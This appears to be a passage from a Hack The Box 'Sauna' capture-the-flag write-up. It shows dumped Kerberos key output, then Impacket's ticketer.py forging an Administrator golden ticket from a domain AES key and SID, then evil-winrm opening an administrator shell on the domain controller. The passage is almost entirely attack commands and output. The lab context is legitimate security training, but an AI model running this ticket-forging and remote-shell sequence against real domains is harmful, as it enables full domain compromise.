WIN-0DFWRZBRTUM$:des-cbc-md5:04256110a792704f
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7f68eb8f0900>
...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ sudo ntpdate SAUNA
2023-09-22 08:03:09.274713 (+0800) +0.069440 +/- 0.045866 SAUNA 10.129.95.180 s1 no-leap

┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ ticketer.py -aesKey 83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24 -domain-sid S-1-5-21-2966785786-3096785034-1186376766 -domain EGOTISTICAL-BANK.LOCAL Administrator
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for EGOTISTICAL-BANK.LOCAL/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ evil-winrm -r EGOTISTICAL-BANK.LOCAL -i SAUNA.EGOTISTICAL-BANK.LOCAL

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotistical-bank.local\administrator
```

